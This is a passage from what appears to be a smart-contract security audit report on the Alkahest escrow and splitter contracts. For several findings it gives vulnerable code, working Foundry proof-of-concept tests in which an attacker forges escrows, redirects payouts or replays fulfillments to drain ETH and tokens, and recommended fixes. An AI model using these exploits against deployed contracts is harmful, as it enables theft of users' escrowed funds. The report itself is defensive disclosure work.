            StringObligation.ObligationData({item: "fulfill", schema: bytes32(0)}), outerEscrowUid
        );

        vm.prank(bob);
        bytes32 forgedEscrowUid = abi.decode(escrow.collect(outerEscrowUid, fulfillmentUid), (bytes32));

        Attestation memory forgedEscrow = eas.getAttestation(forgedEscrowUid);
        assertEq(forgedEscrow.schema, escrow.ATTESTATION_SCHEMA(), "forged escrow uses the same schema");
        assertTrue(
            escrow.check(forgedEscrow, abi.encode(forgedPaidEscrowData), bytes32(0)),
            "forged escrow passes the same arbiter checks as a real escrow"
        );
        assertEq(address(escrow).balance, STOLEN_VALUE, "minting the forged escrow still leaves it unbacked");

        AttestationEscrowObligation.ObligationData memory decodedForgedEscrow = escrow.getObligationData(forgedEscrowUid);
        assertEq(
            decodedForgedEscrow.attestation.data.value,
            STOLEN_VALUE,
            "forged escrow claims the contract owes the attacker a paid attestation"
        );

        uint256 bobBalanceBefore = bob.balance;
        vm.warp(block.timestamp + 2);

        vm.prank(bob);
        bool reclaimed = escrow.reclaim(forgedEscrowUid);

        assertTrue(reclaimed, "forged escrow should be reclaimable");
        assertEq(address(escrow).balance, 0, "attacker drains ETH from the pooled balance");
        assertEq(bob.balance, bobBalanceBefore + STOLEN_VALUE, "attacker receives the stolen ETH");

        vm.warp(block.timestamp + 31 days);
        vm.prank(alice);
        vm.expectRevert(
            abi.encodeWithSelector(
                AttestationEscrowObligation.NativeTokenTransferFailed.selector, alice, STOLEN_VALUE
            )
        );
        escrow.reclaim(legitimateEscrowUid);
    }

    function _paidAttestationRequest(address recipient, uint64 expirationTime, uint256 value)
        internal
        view
        returns (AttestationRequest memory)
    {
        return AttestationRequest({
            schema: paidSchemaId,
            data: AttestationRequestData({
                recipient: recipient,
                expirationTime: expirationTime,
                revocable: true,
                refUID: bytes32(0),
                data: abi.encode("paid attestation data"),
                value: value
            })
        });
    }
}
```

#### Recommendation

Reject any release request that would attest under the contract's own escrow schema.

Primary fix:

```solidity
function _releaseEscrow(Attestation memory escrow, address, bytes32) internal override returns (bytes memory) {
    ObligationData memory decoded = abi.decode(escrow.data, (ObligationData));
    if (decoded.attestation.schema == ATTESTATION_SCHEMA) revert InvalidEscrowAttestation();
    ...
}
```

Additional hardening:
- reject any release request whose schema resolver is `address(this)` for the same escrow contract;
- track locked native value per escrow instead of relying on pooled balance alone;
- add regression tests that attempt to mint `ATTESTATION_SCHEMA` from `_releaseEscrow()` and then reclaim / reuse the counterfeit escrow.

Fix checklist:

- [ ] Reject any release request whose embedded attestation schema equals `ATTESTATION_SCHEMA` before calling `eas.attest()`.

#### Assumptions

- [x] The victim uses `AttestationEscrowObligation` as an arbiter or otherwise treats its escrow attestations as proof that the embedded paid attestation is fundable.
- [x] The contract holds pooled native ETH from legitimate paid attestation escrows when the forged escrow is reclaimed.
- [x] The attacker can self-fulfill a zero-value outer attestation escrow with a caller-chosen arbiter.

#### Predicted Invalid Reasons

- Attestation escrows are not globally authoritative merely because this contract emitted the attestation; integrators must not over-trust attester identity.

<a id="finding-alka-25"></a>
### ALKA-25 — createFulfillment refunds unrelated ETH inflows and lets a malicious obligation steal collectible native escrows

#### Summary

`BaseSplitter.createFulfillment` snapshots the splitter balance, makes an arbitrary external `doObligationRaw` call, then refunds any post-call native balance increase to `msg.sender`. A malicious obligation can use that window to collect an unrelated, already-collectible native escrow into the splitter and drain the escrowed ETH through `_refundNativeBalanceIncrease` before normal oracle distribution runs.

#### Context Files

##### createFulfillment

Path: `alkahest/contracts/src/utils/splitters/BaseSplitter.sol`
Highlight lines: 100, 101, 104

```solidity
function createFulfillment(address obligationContract, bytes calldata data, uint64 expirationTime, bytes32 refUID)
    external
    payable
    nonReentrant
    returns (bytes32 fulfillmentUid)
{
    uint256 retainedBalance = address(this).balance - msg.value;
    fulfillmentUid = IObligation(obligationContract).doObligationRaw{value: msg.value}(data, expirationTime, refUID);
    _validateCreatedFulfillment(fulfillmentUid, obligationContract, data, expirationTime, refUID);
    fulfillers[fulfillmentUid] = msg.sender;
    _refundNativeBalanceIncrease(retainedBalance, msg.sender);
}
```

##### _refundNativeBalanceIncrease

Path: `alkahest/contracts/src/utils/splitters/BaseSplitter.sol`
Highlight lines: 159, 162, 163

```solidity
function _refundNativeBalanceIncrease(uint256 retainedBalance, address recipient) internal {
    uint256 currentBalance = address(this).balance;
    if (currentBalance <= retainedBalance) return;

    uint256 refundAmount = currentBalance - retainedBalance;
    (bool success,) = payable(recipient).call{value: refundAmount}("");
    if (!success) revert NativeTokenRefundFailed(recipient, refundAmount);
}
```

#### Proof of Concept

- Add the PoC under `contracts/test/poc/POC_NativeTokenSplitter_RefundStealsEscrow_c345a17a.t.sol`.
- Run `timeout 300 forge test --match-path test/poc/POC_NativeTokenSplitter_RefundStealsEscrow_c345a17a.t.sol -vvv`.
- Observe that the attacker balance increases by exactly the victim escrow amount, the victim escrow is revoked during the malicious obligation, and later `collectAndDistribute` reverts.

##### POC_NativeTokenSplitter_RefundStealsEscrow_c345a17a.t.sol

Path: `contracts/test/poc/POC_NativeTokenSplitter_RefundStealsEscrow_c345a17a.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {NativeTokenSplitter} from "@src/utils/splitters/NativeTokenSplitter.sol";
import {NativeTokenEscrowObligation} from "@src/obligations/escrow/default/NativeTokenEscrowObligation.sol";
import {StringObligation} from "@src/obligations/StringObligation.sol";
import {IEAS, Attestation} from "@eas/IEAS.sol";
import {ISchemaRegistry} from "@eas/ISchemaRegistry.sol";
import {EASDeployer} from "@test/utils/EASDeployer.sol";

contract POC_MaliciousCollectingObligation_c345a17a is StringObligation {
    NativeTokenEscrowObligation internal immutable victimEscrow;
    bytes32 internal immutable victimEscrowUid;
    bytes32 internal immutable victimFulfillmentUid;

    constructor(
        IEAS _eas,
        ISchemaRegistry _schemaRegistry,
        NativeTokenEscrowObligation _victimEscrow,
        bytes32 _victimEscrowUid,
        bytes32 _victimFulfillmentUid
    ) StringObligation(_eas, _schemaRegistry) {
        victimEscrow = _victimEscrow;
        victimEscrowUid = _victimEscrowUid;
        victimFulfillmentUid = _victimFulfillmentUid;
    }

    function _afterAttest(Attestation memory) internal override {
        victimEscrow.collect(victimEscrowUid, victimFulfillmentUid);
    }
}

/**
 * @title POC: `createFulfillment` refunds a victim escrow to the attacker
 * @notice Proof Statement: Prove that `NativeTokenSplitter.createFulfillment` refunds any net ETH increase
 * seen during the attacker-controlled `doObligationRaw` call, so a malicious obligation can collect a separately
 * collectible splitter-routed native escrow during `_afterAttest` and force the splitter to forward the victim's
 * escrowed ETH to the attacker instead of the oracle-designated recipient.
 */
contract POC_NativeTokenSplitter_RefundStealsEscrow_c345a17a is Test {
    NativeTokenSplitter internal splitter;
    NativeTokenEscrowObligation internal escrowObligation;
    StringObligation internal stringObligation;
    IEAS internal eas;
    ISchemaRegistry internal schemaRegistry;

    address internal buyer = makeAddr("buyer");
    address internal oracle = makeAddr("oracle");
    address internal executor = makeAddr("executor");
    address internal attacker = makeAddr("attacker");
    address internal alice = makeAddr("alice");

    uint256 internal constant ESCROW_AMOUNT = 1 ether;

    function setUp() public {
        EASDeployer easDeployer = new EASDeployer();
        (eas, schemaRegistry) = easDeployer.deployEAS();
        splitter = new NativeTokenSplitter(eas);
        escrowObligation = new NativeTokenEscrowObligation(eas, schemaRegistry);
        stringObligation = new StringObligation(eas, schemaRegistry);

        vm.deal(buyer, 10 ether);
        vm.deal(executor, 1 ether);
        vm.deal(attacker, 1 ether);
    }

    function _createVictimEscrow() internal returns (bytes32) {
        bytes memory demand = abi.encode(NativeTokenSplitter.DemandData({oracle: oracle, data: bytes("")}));
        NativeTokenEscrowObligation.ObligationData memory data = NativeTokenEscrowObligation.ObligationData({
            amount: ESCROW_AMOUNT,
            arbiter: address(splitter),
            demand: demand
        });

        vm.prank(buyer);
        return escrowObligation.doObligation{value: ESCROW_AMOUNT}(data, uint64(block.timestamp + 7 days));
    }

    function _createVictimFulfillment(bytes32 escrowUid) internal returns (bytes32) {
        bytes memory obligationData = abi.encode(StringObligation.ObligationData({item: "legit", schema: bytes32(0)}));

        vm.prank(executor);
        return splitter.createFulfillment(address(stringObligation), obligationData, 0, escrowUid);
    }

    function testRefundPathStealsCollectedEscrow() public {
        bytes32 victimEscrowUid = _createVictimEscrow();
        bytes32 victimFulfillmentUid = _createVictimFulfillment(victimEscrowUid);

        NativeTokenSplitter.Split[] memory splits = new NativeTokenSplitter.Split[](1);
        splits[0] = NativeTokenSplitter.Split({recipient: alice, amount: ESCROW_AMOUNT});

        vm.prank(oracle);
        splitter.arbitrate(victimFulfillmentUid, victimEscrowUid, splits);

        POC_MaliciousCollectingObligation_c345a17a malicious = new POC_MaliciousCollectingObligation_c345a17a(
            eas, schemaRegistry, escrowObligation, victimEscrowUid, victimFulfillmentUid
        );

        bytes memory attackerObligationData =
            abi.encode(StringObligation.ObligationData({item: "malicious", schema: bytes32(0)}));

        uint256 attackerBalanceBefore = attacker.balance;

        vm.prank(attacker);
        bytes32 attackerFulfillmentUid =
            splitter.createFulfillment(address(malicious), attackerObligationData, 0, bytes32(0));

        assertEq(splitter.fulfillers(attackerFulfillmentUid), attacker, "attacker fulfillment recorded");
        assertEq(attacker.balance, attackerBalanceBefore + ESCROW_AMOUNT, "attacker receives victim escrow via refund");
        assertEq(address(splitter).balance, 0, "splitter does not retain stolen escrow");

        Attestation memory victimEscrowAttestation = eas.getAttestation(victimEscrowUid);
        assertTrue(victimEscrowAttestation.revocationTime > 0, "victim escrow consumed during malicious obligation");
        assertEq(alice.balance, 0, "oracle-designated recipient receives nothing");

        vm.expectRevert();
        splitter.collectAndDistribute(address(escrowObligation), victimEscrowUid, victimFulfillmentUid);
    }
}
```

##### forge test

Path: `contracts/`

```bash
timeout 300 forge test --match-path test/poc/POC_NativeTokenSplitter_RefundStealsEscrow_c345a17a.t.sol -vvv
```

#### Recommendation

Remove balance-delta-based refunding from `createFulfillment`.

Primary fix:
- Require obligation contracts to return an explicit refund amount (or transfer refunds directly to the original caller) instead of inferring refunds from the splitter’s raw ETH balance.
- Never refund arbitrary net ETH inflows observed during the external obligation call.

Additional hardening:
- Restrict `createFulfillment` to trusted obligation implementations if the helper must continue to make arbitrary external calls while holding settlement-critical balances.
- If refund support must remain generic, track and verify a cryptographically or contractually authenticated refund source rather than the splitter’s aggregate balance.

#### Assumptions

- [x] An arbitrary `obligationContract` can be supplied to `createFulfillment`.
- [x] A malicious obligation can trigger `collect` on a different escrow during the external call window.
- [x] `nonReentrant` does not block that escrow from reaching the splitter through a `view` `check` and ETH transfer.
- [x] `_refundNativeBalanceIncrease` refunds the full positive balance delta without attributing its source.
- [x] The attacker does not need control over the victim oracle; the escrow only needs to be collectible once.

#### Predicted Invalid Reasons

- The refund path is only meant to forward change from payment obligations, so malicious obligations are out of scope.

<a id="finding-alka-17"></a>
### ALKA-17 — Proxy collect can substitute a different fulfillment and redirect EXECUTOR_SENTINEL payouts to an attacker-recorded fulfiller

#### Summary

A malicious proxy escrow can forward collection to a real victim escrow with a different fulfillment, satisfy the splitter’s balance-delta checks, and then pay `EXECUTOR_SENTINEL` to an attacker via `_recordedFulfiller(fakeFulfillment)`. The splitter never proves that the fulfillment it uses for routing is the one the escrow actually consumed.

#### Context Files

##### BaseSplitter sentinel routing

Path: `contracts/src/utils/splitters/BaseSplitter.sol`
Highlight lines: 1

```solidity
address fulfiller = _recordedFulfiller(fulfillment);
for (uint256 i; i < splits.length; ++i) {
    address recipient = _resolveSentinel(splits[i].recipient, fulfillment, fulfiller);
    ...
}
```

##### _resolveSentinel

Path: `contracts/src/utils/splitters/BaseSplitter.sol`
Highlight lines: 1

```solidity
function _resolveSentinel(address recipient, bytes32 fulfillment, address fulfiller)
    internal
    pure
    returns (address)
{
    if (recipient == EXECUTOR_SENTINEL) {
        if (fulfiller == address(0)) revert NoFulfillerRecorded(fulfillment);
        recipient = fulfiller;
    }
    return recipient;
}
```

##### collect and decode

Path: `contracts/src/utils/splitters/ERC20Splitter.sol`
Highlight lines: 1, 2

```solidity
splits = decisions[demandData.oracle][_decisionKey(fulfillment, escrow)];
IEscrow(escrowContract).collect(escrow, fulfillment);
```

#### Proof of Concept

- Deploy a forwarding escrow proxy whose `collect` ignores `(fakeEscrow, fakeFulfillment)` and settles the real victim escrow.
- Create `fakeFulfillment` through `createFulfillment` so `fulfillers[fakeFulfillment] = attacker`.
- Record a fake split that routes to `EXECUTOR_SENTINEL` and call `collectAndDistribute(address(proxy), fakeEscrowUid, fakeFulfillmentUid)`.
- The splitter accepts the victim assets by balance delta and sends the executor share to the attacker.

##### POC_ERC20Splitter_980b50ab.t.sol

Path: `contracts/test/unit/utils/splitters/POC_ERC20Splitter_980b50ab.t.sol`

```solidity
  // SPDX-License-Identifier: UNLICENSED
  pragma solidity ^0.8.26;
  
  import "forge-std/Test.sol";
  
  import {ERC20Splitter} from "@src/utils/splitters/ERC20Splitter.sol";
  import {ERC20EscrowObligation} from "@src/obligations/escrow/default/ERC20EscrowObligation.sol";
  import {StringObligation} from "@src/obligations/StringObligation.sol";
  import {BaseObligation} from "@src/BaseObligation.sol";
  import {IEscrow} from "@src/IEscrow.sol";
  import {IEAS} from "@eas/IEAS.sol";
  import {ISchemaRegistry} from "@eas/ISchemaRegistry.sol";
  import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
  
  import {EASDeployer} from "@test/utils/EASDeployer.sol";
  
  contract POCMintableERC20 is ERC20 {
      constructor() ERC20("Mock Token", "MCK") {
          _mint(msg.sender, 10_000e18);
      }
  
      function mint(address to, uint256 amount) external {
          _mint(to, amount);
      }
  }
  
  contract ForwardingERC20EscrowProxy is BaseObligation {
      IEscrow public immutable victimEscrow;
      bytes32 public immutable victimEscrowUid;
      bytes32 public immutable victimFulfillmentUid;
  
      constructor(
          IEAS eas,
          ISchemaRegistry schemaRegistry,
          IEscrow _victimEscrow,
          bytes32 _victimEscrowUid,
          bytes32 _victimFulfillmentUid
      )
          BaseObligation(eas, schemaRegistry, "address arbiter, bytes demand, address token, uint256 amount", true)
      {
          victimEscrow = _victimEscrow;
          victimEscrowUid = _victimEscrowUid;
          victimFulfillmentUid = _victimFulfillmentUid;
      }
  
      function collect(bytes32, bytes32) external returns (bytes memory) {
          return victimEscrow.collect(victimEscrowUid, victimFulfillmentUid);
      }
  }
  
  /**
   * @title POC: Proxy collect rebinds EXECUTOR_SENTINEL to attacker state
   * @notice Proof Statement: Prove that an attacker can create a fake splitter fulfillment and a fake escrow
   * attestation, then call `collectAndDistribute` through a proxy escrow whose `collect` settles a different
   * real escrow/fulfillment pair; the splitter receives the victim escrow's tokens but resolves
   * `EXECUTOR_SENTINEL` from the attacker's fake fulfillment, paying the attacker instead of the real executor.
   */
  contract POC_ERC20Splitter_980b50ab_Test is Test {
      ERC20Splitter internal splitter;
      ERC20EscrowObligation internal victimEscrow;
      StringObligation internal stringObligation;
      IEAS internal eas;
      ISchemaRegistry internal schemaRegistry;
      POCMintableERC20 internal token;
  
      address internal buyer = makeAddr("buyer");
      address internal victimOracle = makeAddr("victimOracle");
      address internal executor = makeAddr("executor");
      address internal attacker = makeAddr("attacker");
  
      uint256 internal constant AMOUNT = 100e18;
      uint64 internal constant EXPIRATION = 365 days;
  
      function setUp() public {
          EASDeployer easDeployer = new EASDeployer();
          (eas, schemaRegistry) = easDeployer.deployEAS();
  
          splitter = new ERC20Splitter(eas);
          victimEscrow = new ERC20EscrowObligation(eas, schemaRegistry);
          stringObligation = new StringObligation(eas, schemaRegistry);
          token = new POCMintableERC20();
  
          token.transfer(buyer, 1_000e18);
      }
  
      function testProxyCollectRedirectsExecutorSentinelToAttacker() public {
          bytes32 victimEscrowUid = _createVictimEscrow();
          bytes32 victimFulfillmentUid = _createFulfillmentViaSplitter(executor, victimEscrowUid);
  
          ERC20Splitter.Split[] memory victimSplits = new ERC20Splitter.Split[](1);
          victimSplits[0] = ERC20Splitter.Split({recipient: splitter.EXECUTOR_SENTINEL(), amount: AMOUNT});
  
          vm.prank(victimOracle);
          splitter.arbitrate(victimFulfillmentUid, victimEscrowUid, victimSplits);
  
          ForwardingERC20EscrowProxy proxy = new ForwardingERC20EscrowProxy(
              eas, schemaRegistry, IEscrow(address(victimEscrow)), victimEscrowUid, victimFulfillmentUid
          );
  
          bytes memory fakeDemand = abi.encode(ERC20Splitter.DemandData({oracle: attacker, data: bytes("")}));
          bytes memory fakeEscrowData = abi.encode(
              ERC20Splitter.EscrowObligationData({
                  arbiter: address(splitter),
                  demand: fakeDemand,
                  token: address(token),
                  amount: AMOUNT
              })
          );
  
          vm.prank(attacker);
          bytes32 fakeEscrowUid = proxy.doObligationRaw(fakeEscrowData, 0, bytes32(0));
          bytes32 fakeFulfillmentUid = _createFulfillmentViaSplitter(attacker, fakeEscrowUid);
  
          ERC20Splitter.Split[] memory fakeSplits = new ERC20Splitter.Split[](1);
          fakeSplits[0] = ERC20Splitter.Split({recipient: splitter.EXECUTOR_SENTINEL(), amount: AMOUNT});
  
          vm.prank(attacker);
          splitter.arbitrate(fakeFulfillmentUid, fakeEscrowUid, fakeSplits);
  
          assertEq(splitter.fulfillers(victimFulfillmentUid), executor, "victim executor should be recorded");
          assertEq(splitter.fulfillers(fakeFulfillmentUid), attacker, "attacker should control fake fulfillment");
  
          vm.prank(attacker);
          splitter.collectAndDistribute(address(proxy), fakeEscrowUid, fakeFulfillmentUid);
  
          assertEq(token.balanceOf(attacker), AMOUNT, "attacker should receive the executor share");
          assertEq(token.balanceOf(executor), 0, "real executor should receive nothing");
          assertEq(token.balanceOf(address(splitter)), 0, "splitter should not retain funds");
          assertEq(token.balanceOf(address(victimEscrow)), 0, "victim escrow should be drained");
      }
  
      function _createVictimEscrow() internal returns (bytes32) {
          bytes memory demand = abi.encode(ERC20Splitter.DemandData({oracle: victimOracle, data: bytes("")}));
          ERC20EscrowObligation.ObligationData memory data = ERC20EscrowObligation.ObligationData({
              arbiter: address(splitter),
              demand: demand,
              token: address(token),
              amount: AMOUNT
          });
  
          vm.startPrank(buyer);
          token.approve(address(victimEscrow), AMOUNT);
          bytes32 escrowUid = victimEscrow.doObligation(data, uint64(block.timestamp + EXPIRATION));
          vm.stopPrank();
  
          return escrowUid;
      }
  
      function _createFulfillmentViaSplitter(address fulfiller, bytes32 refUID) internal returns (bytes32) {
          bytes memory obligationData =
              abi.encode(StringObligation.ObligationData({item: "fulfillment", schema: bytes32(0)}));
  
          vm.prank(fulfiller);
          return splitter.createFulfillment(address(stringObligation), obligationData, 0, refUID);
      }
  }

```

#### Recommendation

Bind sentinel routing to the fulfillment actually consumed by the escrow.

Primary fix:
- Make `collect` return the consumed fulfillment UID and require it to equal the splitter call’s `fulfillment` parameter before any distribution occurs.
- Reject escrow implementations that cannot prove which fulfillment they actually settled.

Additional hardening:
- Restrict splitter settlement to canonical escrow implementations or a trusted factory.
- Avoid using `EXECUTOR_SENTINEL` unless the settlement path can prove the consumed fulfillment and the routed fulfillment are identical.

Fix checklist:

- [ ] Make `collect` return an authenticated receipt with the consumed escrow UID and fulfillment UID.
- [ ] Require the splitter to compare that receipt against its `escrow` and `fulfillment` inputs before any payout or sentinel resolution.
- [ ] Thread receipt validation through every external-collection splitter path, including ERC20 and token-bundle settlement flows.

#### Assumptions

- [x] The victim workflow uses `EXECUTOR_SENTINEL`.
- [x] The splitter does not verify that the escrow consumed the same fulfillment UID it later uses for payout routing.
- [x] `createFulfillment` is public and available to an attacker.
- [x] The attacker does not need to alter the victim's actual fulfillment.
- [x] The bug is not just generic malicious-recipient selection; the sentinel binding itself is broken.

#### Predicted Invalid Reasons

- "The splitter already checks that the supplied escrow attestation belongs to the supplied escrow contract, so a foreign collect cannot be smuggled in."

<a id="finding-alka-5"></a>
### ALKA-5 — CommitRevealObligation replays one revealed fulfillment across later unconditional escrows

#### Summary

`CommitRevealObligation.check()` validates a fulfillment against the fulfillment attestation's own historical `refUID` instead of the live `escrowUid` supplied by `IArbiter.check()`. On unconditional escrows, that lets one previously revealed fulfillment be replayed against later escrows with the same demand, releasing value to the attacker-controlled recipient.

#### Context Files

##### CommitRevealObligation.check()

Path: `alkahest/contracts/src/obligations/CommitRevealObligation.sol`
Highlight lines: 224, 236, 254

```solidity
function check(Attestation memory obligation, bytes memory demand, bytes32 /* fulfilling */)
    public view override returns (bool)
{
    if (obligation.schema != ATTESTATION_SCHEMA) return false;
    bytes32 revealedCommitment =
        keccak256(abi.encode(obligation.refUID, obligation.recipient, keccak256(obligation.data)));
    CommitInfo memory info = commitments[revealedCommitment];
    ...
    return info.bondAmount == demandData.bondAmount;
}
```

##### CommitRevealObligation reveal commitment

Path: `alkahest/contracts/src/obligations/CommitRevealObligation.sol`
Highlight lines: 145, 172

```solidity
bytes32 revealedCommitment =
    keccak256(abi.encode(attestation.refUID, attestation.recipient, keccak256(attestation.data)));
...
if (commitmentClaimed[revealedCommitment]) {
    revert BondAlreadyClaimed(revealedCommitment);
}
commitmentClaimed[revealedCommitment] = true;
```

##### BaseEscrowObligationUnconditional.collect()

Path: `alkahest/contracts/src/BaseEscrowObligationUnconditional.sol`
Highlight lines: 96, 100, 113

```solidity
// UNCONDITIONAL: No fulfillment intrinsic or refUID check
if (!IArbiter(arbiter).check(fulfillment, demand, escrow.uid)) {
    revert InvalidFulfillment();
}
bytes memory result = _releaseEscrow(escrow, fulfillment.recipient, _fulfillment);
```

#### Proof of Concept

1. Save the test as `contracts/test/unit/obligations/POC_CommitRevealObligation_455beda5.t.sol`.
2. From `contracts/`, run `timeout 300 forge test --match-path test/unit/obligations/POC_CommitRevealObligation_455beda5.t.sol -vv`.
3. Observe the passing assertion that the attacker collects the victim escrow even though the fulfillment references a different escrow UID.

##### Foundry reproduction command

Path: ``

```bash
timeout 300 forge test --match-path test/unit/obligations/POC_CommitRevealObligation_455beda5.t.sol -vv
```

##### POC_CommitRevealObligation_455beda5.t.sol

Path: `contracts/test/unit/obligations/POC_CommitRevealObligation_455beda5.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {Attestation, IEAS} from "@eas/IEAS.sol";
import {ISchemaRegistry} from "@eas/ISchemaRegistry.sol";
import {CommitRevealObligation} from "@src/obligations/CommitRevealObligation.sol";
import {NativeTokenEscrowObligation} from "@src/obligations/escrow/default/NativeTokenEscrowObligation.sol";
import {
    UnconditionalNativeTokenEscrowObligation
} from "@src/obligations/escrow/unconditional/UnconditionalNativeTokenEscrowObligation.sol";
import {EASDeployer} from "@test/utils/EASDeployer.sol";

/**
 * @title POC: CommitReveal fulfillment replays across unconditional escrows
 * @notice Proof Statement: Prove that a revealed `CommitRevealObligation` fulfillment created for one escrow can
 * settle a different `UnconditionalNativeTokenEscrowObligation` escrow with the same demand because
 * `CommitRevealObligation.check` ignores the current `escrowUid` and unconditional collect omits the default
 * `refUID` binding; this lets an attacker reuse one refunded reveal to steal the victim escrow's native tokens.
 */
contract POC_CommitRevealObligation_455beda5_Test is Test {
    CommitRevealObligation internal obligation;
    NativeTokenEscrowObligation internal defaultEscrow;
    UnconditionalNativeTokenEscrowObligation internal unconditionalEscrow;
    IEAS internal eas;
    ISchemaRegistry internal schemaRegistry;

    address internal attacker;
    address internal victim;
    address internal treasury;

    uint256 internal constant BOND = 0.1 ether;
    uint256 internal constant COMMIT_DEADLINE = 1 hours;
    uint256 internal constant ESCROW_AMOUNT = 5 ether;

    function setUp() public {
        EASDeployer easDeployer = new EASDeployer();
        (eas, schemaRegistry) = easDeployer.deployEAS();

        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        treasury = makeAddr("treasury");

        obligation = new CommitRevealObligation(eas, schemaRegistry, treasury);
        defaultEscrow = new NativeTokenEscrowObligation(eas, schemaRegistry);
        unconditionalEscrow = new UnconditionalNativeTokenEscrowObligation(eas, schemaRegistry);
    }

    function testReplayRevealedFulfillmentAcrossUnconditionalEscrows() public {
        CommitRevealObligation.ObligationData memory revealData = CommitRevealObligation.ObligationData({
            payload: bytes("payload"),
            salt: bytes32("salt"),
            schema: bytes32("schema-tag")
        });
        bytes memory demand =
            abi.encode(CommitRevealObligation.DemandData({bondAmount: BOND, commitDeadline: COMMIT_DEADLINE}));

        NativeTokenEscrowObligation.ObligationData memory seedEscrowData =
            NativeTokenEscrowObligation.ObligationData({arbiter: address(obligation), demand: demand, amount: 0});

        vm.prank(attacker);
        bytes32 seedEscrowUid = defaultEscrow.doObligation(seedEscrowData, 0);

        bytes32 commitment = obligation.computeCommitment(seedEscrowUid, attacker, revealData);

        vm.deal(attacker, BOND);
        vm.prank(attacker);
        obligation.commit{value: BOND}(commitment, COMMIT_DEADLINE);

        vm.roll(block.number + 1);

        uint256 attackerBalanceBeforeReveal = attacker.balance;
        vm.prank(attacker);
        bytes32 fulfillmentUid = obligation.doObligation(revealData, seedEscrowUid);

        assertEq(attacker.balance, attackerBalanceBeforeReveal + BOND, "bond refunded on reveal");
        assertTrue(obligation.commitmentClaimed(commitment), "revealed commitment already claimed");

        UnconditionalNativeTokenEscrowObligation.ObligationData memory victimEscrowData =
            UnconditionalNativeTokenEscrowObligation.ObligationData({
                arbiter: address(obligation),
                demand: demand,
                amount: ESCROW_AMOUNT
            });

        vm.deal(victim, ESCROW_AMOUNT);
        vm.prank(victim);
        bytes32 victimEscrowUid = unconditionalEscrow.doObligation{value: ESCROW_AMOUNT}(victimEscrowData, 0);

        Attestation memory fulfillment = eas.getAttestation(fulfillmentUid);
        assertEq(fulfillment.recipient, attacker, "fulfillment recipient is attacker");
        assertTrue(fulfillment.refUID != victimEscrowUid, "fulfillment references a different escrow");
        assertTrue(obligation.check(fulfillment, demand, victimEscrowUid), "arbiter accepts foreign fulfillment");

        uint256 attackerBalanceBeforeCollect = attacker.balance;
        vm.prank(attacker);
        unconditionalEscrow.collect(victimEscrowUid, fulfillmentUid);

        assertEq(attacker.balance, attackerBalanceBeforeCollect + ESCROW_AMOUNT, "attacker steals victim escrow");
        assertEq(address(unconditionalEscrow).balance, 0, "victim escrow drained");
    }
}
```

#### Recommendation

Bind the arbiter to the current escrow inside `check`, and reject already-consumed commitments:

```solidity
if (obligation.refUID != escrowUid) return false;
if (commitmentClaimed[revealedCommitment]) return false;
```

This keeps commit-reveal safe regardless of whether the calling escrow is default or unconditional.

Fix checklist:

- [ ] Reject any fulfillment whose `obligation.refUID` differs from `escrowUid` at the start of `CommitRevealObligation.check()`.

#### Assumptions

- [x] The victim creates an unconditional escrow that uses `CommitRevealObligation` as its arbiter.
- [x] The attacker already has one valid revealed fulfillment with the same `DemandData` parameters.
- [x] No wrapper arbiter adds a `ReferencesEscrowArbiter`-style comparison against the current `escrowUid`.

#### Predicted Invalid Reasons

- “Unconditional escrows are intentionally the explicit escape hatch; if a user wants escrow binding they should stay on the default escrow path or compose `ReferencesEscrowArbiter` themselves.”

<a id="high"></a>
## High

<a id="finding-alka-31"></a>
### ALKA-31 — Any caller can permanently brick splitter settlements by calling the underlying escrow directly

#### Summary

A public call to the base escrow `collect()` can revoke a splitter-addressed escrow before the splitter settles it. The assets end up in the splitter, but every splitter settlement entrypoint then fails because it requires the escrow attestation to remain live, permanently stranding the collected funds.

#### Context Files

##### BaseEscrowObligation.sol

Path: `alkahest/contracts/src/BaseEscrowObligation.sol`
Highlight lines: 1, 8

```solidity
function collect(bytes32 _escrow, bytes32 _fulfillment)
    public
    virtual
    override
    nonReentrant
    returns (bytes memory)
{
    Attestation memory escrow = _getExistingAttestation(_escrow);
    Attestation memory fulfillment = _getExistingAttestation(_fulfillment);
    ...
    if (!IArbiter(arbiter).check(fulfillment, demand, escrow.uid)) {
        revert InvalidFulfillment();
    }
    eas.revoke(...);
    bytes memory result = _releaseEscrow(escrow, fulfillment.recipient, _fulfillment);
    emit EscrowCollected(_escrow, _fulfillment, fulfillment.recipient);
    return result;
}
```

##### ERC20Splitter.sol

Path: `alkahest/contracts/src/utils/splitters/ERC20Splitter.sol`
Highlight lines: 1, 7

```solidity
function _collectAndDecode(address escrowContract, bytes32 escrow, bytes32 fulfillment)
    internal
    returns (Split[] memory splits, address token)
{
    Attestation memory escrowAttestation = eas.getAttestation(escrow);
    escrowAttestation.verifyEscrowAttestation(escrowContract);
    Attestation memory fulfillmentAttestation = eas.getAttestation(fulfillment);
    fulfillmentAttestation.verifyFulfillmentRecipient();
    ...
    IEscrow(escrowContract).collect(escrow, fulfillment);
    SplitterVerification.verifyDelta(...);
}
```

#### Proof of Concept

This Foundry PoC creates a splitter-addressed ERC20 escrow, records a valid split decision, then has an unrelated attacker call the underlying escrow's public `collect()`. The escrow is revoked, the tokens move into the splitter, and both `collectAndDistribute` and `unsafePartiallyCollectAndDistribute` revert with `ArbiterUtils.AttestationRevoked`, leaving the funds stranded.

##### POC_ERC20Splitter_c90819c7_Test

Path: `test/unit/utils/splitters/POC_ERC20Splitter_c90819c7.t.sol`

```solidity
  // SPDX-License-Identifier: UNLICENSED
  pragma solidity ^0.8.26;
  
  import "forge-std/Test.sol";
  import {ERC20Splitter} from "@src/utils/splitters/ERC20Splitter.sol";
  import {ERC20EscrowObligation} from "@src/obligations/escrow/default/ERC20EscrowObligation.sol";
  import {StringObligation} from "@src/obligations/StringObligation.sol";
  import {ArbiterUtils} from "@src/libraries/ArbiterUtils.sol";
  import {IEAS, Attestation} from "@eas/IEAS.sol";
  import {ISchemaRegistry} from "@eas/ISchemaRegistry.sol";
  import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
  
  import {EASDeployer} from "@test/utils/EASDeployer.sol";
  
  contract POCMockERC20 is ERC20 {
      constructor() ERC20("Mock Token", "MCK") {
          _mint(msg.sender, 10_000 ether);
      }
